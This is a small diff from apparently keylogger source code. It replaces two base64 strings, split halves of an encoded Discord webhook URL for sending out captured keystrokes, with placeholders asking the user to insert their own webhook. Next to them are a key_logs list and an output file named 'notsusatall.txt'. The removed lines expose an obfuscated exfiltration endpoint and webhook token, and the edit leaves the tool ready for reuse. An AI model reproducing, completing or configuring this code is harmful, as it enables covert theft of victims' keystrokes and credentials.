@@ -13,8 +13,8 @@ import psutil
 import uuid
 
 
-key6 = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ0MTUwMDM0MzYzOTg3MTUzOS9Wc3EtZzFybFRFbk'
-key7 = 'dQdFk0QS1sZ1BDbUlyM25rY1gtMFZTQUtiOGRtb2hmRWJfcHBYTVhLT3ljdEEyeUZ6bXNkUHJ3cw=='
+key6 = 'put half of you discord server key here'
+key7 = 'and the second half here'
 output_file = "notsusatall.txt"
 
 key_logs = []
